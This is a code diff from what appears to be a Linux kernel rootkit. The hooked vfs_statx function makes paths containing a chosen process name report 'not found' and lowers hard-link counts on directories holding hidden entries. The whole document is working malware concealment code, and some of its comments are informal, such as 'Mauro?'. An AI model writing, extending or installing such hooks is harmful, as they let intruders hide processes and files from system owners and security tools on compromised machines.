@@ -1011,27 +1011,26 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
-    /** size is more than enough for what is needed here. */
+    /** XXX do I need this much */
     char kernbuf[PROCNAME_MAXLEN+6] = {0};
 
+    /* call original first, I want stat */
     long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
     if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
-
         if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
             int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
             if (count > 0) {
                 prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
+
+                /* Hit(s) -> decrement hard-link counts */
                 stat->nlink -= count;
             }
+        } else if (strstr(kernbuf, PROCNAME)) {
+            /* Mauro? */
+            rv = -ENOENT;
         }
-
-        /** we don't exist */
-        if (strstr(kernbuf, PROCNAME))
-            return -ENOENT;
     }
-
-    /** return normal */
     return rv;
 }
 
